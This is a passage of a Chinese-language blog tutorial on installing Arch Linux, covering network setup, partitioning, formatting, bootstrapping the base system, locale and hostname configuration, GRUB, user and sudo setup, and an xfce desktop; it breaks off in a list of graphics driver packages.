</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=9 ttl=49 time=111 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=10 ttl=48 time=111 ms
</span></span><span class="line"><span class="cl">^C
</span></span><span class="line"><span class="cl">--- weepingdogel.github.io ping statistics ---
</span></span><span class="line"><span class="cl">11 packets transmitted, 9 received, 18.1818% packet loss, time 10801ms
</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev = 110.224/112.036/114.157/1.355 ms
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果返回的不是类似于上面的信息，那么你可能没有正确连接到网络，你需要这样做</p>
<p>检查网卡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># ip link
</span></span></code></pre></td></tr></table>
</div>
</div><p>将会返回这些</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
</span></span><span class="line"><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class="line"><span class="cl">2: enp3s0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
</span></span><span class="line"><span class="cl">    link/ether bc:5f:f4:aa:04:c9 brd ff:ff:ff:ff:ff:ff
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>lo</code> 是指 localhost ，一般情况下，如果你只有一个网卡的话，类似于 <code>enp3s0</code> 的名称就是你的网卡了，但不同品牌的网卡显示的也不同，如 Intel 网卡可能显示为 <code>ens33</code> 之类的。下面用 <code>&lt;网卡名&gt;</code> 来指代吧</p>
<p>设置网卡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># ip link set &lt;网卡名&gt; up
</span></span></code></pre></td></tr></table>
</div>
</div><p>使用 <code>dhcpcd</code> 命令来自动匹配 DHCP 地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># dhcpcd
</span></span></code></pre></td></tr></table>
</div>
</div><p>它会自动帮你获取到 DHCP 地址，然后你就能连接到网络了</p>
<h3 id="同步系统时间">同步系统时间</h3>
<p>你需要保证 Live CD 目前的时间是准确的</p>
<p>这里执行 <code>timedatectl</code> 命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># timedatectl set-ntp true
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="分区">分区</h3>
<p>这里一直都是比较关键的部分，分区..</p>
<p>首先，你需要查看你的硬盘是否被识别</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># fdisk -l
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里引入一个 <strong>块设备的概念</strong></p>
<p></p>
<p>也就是说如果被识别到，就会以 <code>/dev/sda</code> 或者 <code>/dev/nvme0n1</code> 这样，来表示你的硬盘。</p>
<p><code>rom</code>，<code>loop</code>，或者<code>airoot</code> 这样的，可以忽略不管。</p>
<h4 id="建立分区">建立分区</h4>
<p>有两种分区方式，一种是对于 BIOS+MBR 启动的，另一种是 UEFI启动配GPT分区的。</p>
<p>这里列个表格吧</p>
<ul>
<li>BIOS 和 MBR</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:left">挂载点</th>
<th>分区</th>
<th style="text-align:left">分区类型</th>
<th style="text-align:left">建议大小</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>/mnt</code></td>
<td><code>/dev/sdX1</code></td>
<td style="text-align:left">Linux</td>
<td style="text-align:left">剩余空间</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">[SWAP]</td>
<td><code>/dev/sdX2</code></td>
<td style="text-align:left">Linux swap (交换空间)</td>
<td style="text-align:left">大于 512 MB</td>
<td></td>
</tr>
</tbody>
</table>
<ul>
<li>UEFI with GPT</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:left">挂载点</th>
<th>分区</th>
<th style="text-align:left">分区类型</th>
<th style="text-align:left">建议大小</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>/mnt/efi</code></td>
<td><code>/dev/sdX1</code></td>
<td style="text-align:left">EFI 系统分区</td>
<td style="text-align:left">260-512 MB</td>
<td></td>
</tr>
<tr>
<td style="text-align:left"><code>/mnt</code></td>
<td><code>/dev/sdX2</code></td>
<td style="text-align:left">Linux</td>
<td style="text-align:left">剩余空间</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">[SWAP]</td>
<td><code>/dev/sdX3</code></td>
<td style="text-align:left">Linux swap (交换空间)</td>
<td style="text-align:left">大于 512 MB</td>
<td></td>
</tr>
</tbody>
</table>
<p>Live CD 里面有几种分区工具 <code>fdisk</code>、<code>parted</code>、<code>cfdisk</code> 等，具体过程我就不写出来了，我推荐用cfdisk，操作简单。</p>
<blockquote>
<p>注意：nvme 协议的硬盘设备名可能不是表上这个，也许是 <code>nvme0p1</code> 之类的。</p>
</blockquote>
<h4 id="格式化">格式化</h4>
<p>当你的分区建好了，这些分区要进行格式化</p>
<p>BIOS + MBR:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># mkfs.ext4 /dev/sdX1
</span></span></code></pre></td></tr></table>
</div>
</div><p>UEFI with GPT:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># mkfs.ext4 /dev/sdX2
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># mkfs.vfat -F 32 /dev/sdX1
</span></span></code></pre></td></tr></table>
</div>
</div><p>不同的分区需要选择不同的文件系统，这个你需要去搜索引擎搜索了，篇幅有限，解释不了这么多。</p>
<p>对于交换分区(第一个表中的 <code>/dev/sdx2</code>、第二个表中的 <code>/dev/sdX3</code>)，需要使用 <code>mkswap</code> 将其初始化：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># mkswap /dev/sdX2
</span></span></code></pre></td></tr></table>
</div>
</div><p>挂载 swap</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># swapon /dev/sdX2
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="挂载分区">挂载分区</h4>
<p>将根分区挂载到<code>/mnt</code>，参考命令:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># mount /dev/sdX1 /mnt
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装基本系统">安装基本系统</h3>
<p>这个时候我们就已经可以安装基本系统了，但仍需要按照下面的步骤做</p>
<h4 id="选择镜像">选择镜像</h4>
<p>Arch Linux是通过网络安装的，它会通过镜像源直接在所在的分区下载需要的安装文件，安装速度较快，这也是为什么要确认网络是否连接。</p>
<p>而现在要做的是选择离你所在地最近的镜像源</p>
<p>这个文件 <code>/etc/pacman.d/mirrorlist</code> 里面写好了所有的镜像源，定义了软件包会从哪一个镜像源下载。在 Live CD 中，所有的镜像都会被启用，文件中是按照同步情况和速度进行排序的。</p>
<p>这个是你需要做的是修改它的顺序，将离你最近的镜像地址修改到第一位，你可以使用 <code>nano</code> 进行修改</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># nano /etc/pacman.d/mirrorlist
</span></span></code></pre></td></tr></table>
</div>
</div><p>在 nano 中，<code>CTRL</code>+<code>W</code> 为搜索，你可以通过这个在文件中搜索你所在国家或地区的名称，再将其下面的镜像地址使用 <code>CTRL</code>+<code>K</code> 进行剪切，再将其用 <code>CTRL</code>+<code>U</code> 粘贴到第一行即可。</p>
<h4 id="安装必要软件包">安装必要软件包</h4>
<p>Linux是由软件包组成的操作系统，而如果要启动它，就必须具备必要的软件包。</p>
<p>这个时候我们使用 <code>pacstrap</code> 脚本，安装 <code>base</code> 软件包 和 Linux 内核还有硬件的固件，这样基本系统很快就构建完成了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># pacstrap /mnt base linux linux-firmware
</span></span></code></pre></td></tr></table>
</div>
</div><p>我推荐这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># pacstrap /mnt base base-devel linux linux-firmware linux-headers
</span></span></code></pre></td></tr></table>
</div>
</div><p>这样能够尽可能的安装上更多的基本软件。</p>
<p>一顿文字输出过后，基本系统就安装完成了。</p>
<h3 id="配置系统">配置系统</h3>
<p>基本系统刚安装完是没有灵魂的，需要进行配置才能完美地使用</p>
<h4 id="fstab">Fstab</h4>
<p>首先肯定要生成一个fstab文件，否则系统连硬盘都不认识。
用 <code>genfstab</code> 来生成</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># genfstab -U /mnt &gt;&gt; /mnt/etc/fstab
</span></span></code></pre></td></tr></table>
</div>
</div><p>最好在执行完以上命令后查看一下生成的 <code>/mnt/etc/fstab</code> 文件是否正确。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># cat /mnt/etc/fstab
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="chroot">Chroot</h4>
<p>Chroot 是 &ldquo;Change root&rdquo; 的缩写，意思是更改根目录，而我们需要将 Live CD 的根目录更改为你安装好的系统的目录，这样才能操作它</p>
<p>用 <code>arch-chroot</code> 这个命令就可以了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># arch-chroot /mnt
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="时区">时区</h4>
<p>chroot 完以后，第一步要修改时区</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># ln -sf /usr/share/zoneinfo/Region/City /etc/localtime
</span></span></code></pre></td></tr></table>
</div>
</div><p>例如</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来运行 <code>hwclock</code> 生成 <code>/etc/adjtime</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># hwclock --systohc
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="本地化">本地化</h4>
<blockquote>
<p>本地化的程序与库若要本地化文本，都依赖 Locale，后者明确规定地域、货币、时区日期的格式、字符排列方式和其他本地化标准等等。在下面两个文件设置：<code>locale.gen</code> 与 <code>locale.conf</code>。 —— Arch Wiki</p>
</blockquote>
<p>所以不用多解释了&hellip;</p>
<p>编辑这个文件 <code>/etc/locale.gen</code> ，移除需要语言前面的 <code>#</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># vim /etc/locale.gen
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后执行 <code>locale-gen</code> 生成 locale 讯息:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># locale-gen
</span></span></code></pre></td></tr></table>
</div>
</div><p>在 <code>/etc/</code> 目录下创建 一个叫 <code>locale.conf</code> 的文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># vim /etc/locale.conf
</span></span></code></pre></td></tr></table>
</div>
</div><p>写入以下内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="na">LANG</span><span class="o">=</span><span class="s">en_US.UTF-8</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="网络">网络</h4>
<p>首先需要安装的是 <code>dhcpcd</code> 这个包，不然安装完成重启后就需要手动配置网络了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># pacman -S networkmanager
</span></span></code></pre></td></tr></table>
</div>
</div><p>启用 NetworkManager 服务</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># systemctl enable NetworkManager
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来创建一个 <code>hostname</code> 文件，这个文件存储你的主机名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># vim /etc/hostname
</span></span></code></pre></td></tr></table>
</div>
</div><p>写入以下内容，随便写，<strong>但是要记住</strong>，这里以 <code>myhostname</code> 代替了，</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">myhostname
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来编辑 <code>/etc/hosts</code> 这个文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># vim /etc/hosts
</span></span></code></pre></td></tr></table>
</div>
</div><p>写入以下内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">127.0.0.1	localhost
</span></span><span class="line"><span class="cl">::1		localhost
</span></span><span class="line"><span class="cl">127.0.1.1	myhostname.localdomain	myhostname
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来，执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># systemctl enable dhcpcd
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后在安装完成之后就不需要担心网络连接问题了</p>
<h4 id="root-密码">Root 密码</h4>
<p>你需要设置一个 root 密码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># passwd
</span></span></code></pre></td></tr></table>
</div>
</div><p>这样基本系统就差不多完成了，但是现在还不能重启，因为它目前无法被引导。</p>
<h3 id="安装启动引导器">安装启动引导器</h3>
<p>如上面所说，你需要一个启动引导程序才能启动系统，Linux 有很多类似于这样的软件，可以在<a href="https://wiki.archlinux.org/index.php/Boot_loaders_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">这个页面</a>参考.</p>
<p>我推荐使用 <code>GRUB</code></p>
<h4 id="安装grub">安装Grub</h4>
<p>先安装 <code>grub</code> 这个软件包</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># pacman -S grub
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里要考虑到两种情况了,</p>
<p><strong>第一种情况: BIOS + MBR</strong></p>
<p>直接执行这条即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># grub-install --target=i386-pc /dev/sdX
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果它返回出 <code>no erros</code> 之类的,那么就可以执行下面的了.</p>
<p>生成 grub 配置文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># grub-mkconfig -o /boot/grub/grub.cfg
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来就可以拔掉 U 盘重启了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># reboot
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>第二种情况: UEFI  + GPT</strong>
这种情况的比较复杂一些,</p>
<p>首先挂载你的EFI分区</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># mount /dev/sdX1 /boot/EFI 
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># grub-install --target=x86_64-efi --efi-directory=/boot/EFI/ --bootloader-id=GRUB
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后还是一样的生成配置文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># grub-mkconfig -o /boot/grub/grub.cfg
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来就可以拔掉 U 盘重启了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># reboot
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="安装后工作">安装后工作</h2>
<p>装完后要做的一些事情.</p>
<h3 id="创建普通用户">创建普通用户</h3>
<p>装完以后, 不建议直接使用 root 用户,需要创建一个普通用户</p>
<p>先使用 root 用户登录,执行这条命令创建一个普通用户</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># useradd -G wheel -m -s /bin/bash &lt;用户名&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来给你的用户设置密码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># passwd &lt;用户名&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>将其添加到 <code>sudoers</code> 列表, 如果你没有安装 <code>sudo</code> 或 <code>base-devel</code> 请先执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># sudo pacman -S sudo
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后编辑 <code>/etc/sudoers</code> 这个文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># vim /etc/sudoers
</span></span></code></pre></td></tr></table>
</div>
</div><p>将你的用户名添加到 <code>root</code> 的下面,照抄即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># Defaults!/usr/bin/sudoreplay !log_output
</span></span><span class="line"><span class="cl"># Defaults!/usr/local/bin/sudoreplay !log_output
</span></span><span class="line"><span class="cl"># Defaults!REBOOT !log_output
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">##
</span></span><span class="line"><span class="cl">## Runas alias specification
</span></span><span class="line"><span class="cl">##
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">##
</span></span><span class="line"><span class="cl">## User privilege specification
</span></span><span class="line"><span class="cl">##
</span></span><span class="line"><span class="cl">root ALL=(ALL) ALL
</span></span><span class="line"><span class="cl">&lt;用户名&gt; ALL=(ALL) ALL
</span></span></code></pre></td></tr></table>
</div>
</div><p>重启即可登录普通用户了.</p>
<h3 id="安装图形界面">安装图形界面</h3>
<p>在安装图形界面之前,我们需要安装的是 xorg , 它是大多数图形界面的依赖&hellip;</p>
<p>算了,这么一大堆说完肯定&hellip;.直接一套安排上吧(xfce)</p>
<p>安装软件包</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -S xorg xfce4 lightdm lightdm-greeter-gtk
</span></span></code></pre></td></tr></table>
</div>
</div><p>设置lightdm启动权限</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo systemctl enable lightdm
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装显卡驱动">安装显卡驱动</h3>
<p>显卡驱动软件包列表.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">extra/xf86-video-amdgpu 19.1.0-2 (xorg-drivers) 
</span></span><span class="line"><span class="cl">    X.org amdgpu video driver
</span></span><span class="line"><span class="cl">extra/xf86-video-ati 1:19.1.0-2 (xorg-drivers)
</span></span><span class="line"><span class="cl">    X.org ati video driver
</span></span><span class="line"><span class="cl">extra/xf86-video-dummy 0.3.8-4 (xorg-drivers)
</span></span><span class="line"><span class="cl">    X.org dummy video driver
</span></span><span class="line"><span class="cl">extra/xf86-video-fbdev 0.5.0-2 (xorg-drivers)
</span></span><span class="line"><span class="cl">    X.org framebuffer video driver
</span></span><span class="line"><span class="cl">extra/xf86-video-intel 1:2.99.917+908+g7181c5a4-1 (xorg-drivers)
</span></span><span class="line"><span class="cl">    X.org Intel i810/i830/i915/945G/G965+ video drivers
</span></span><span class="line"><span class="cl">extra/xf86-video-nouveau 1.0.16-2 (xorg-drivers)
</span></span><span class="line"><span class="cl">    Open Source 3D acceleration driver for nVidia cards
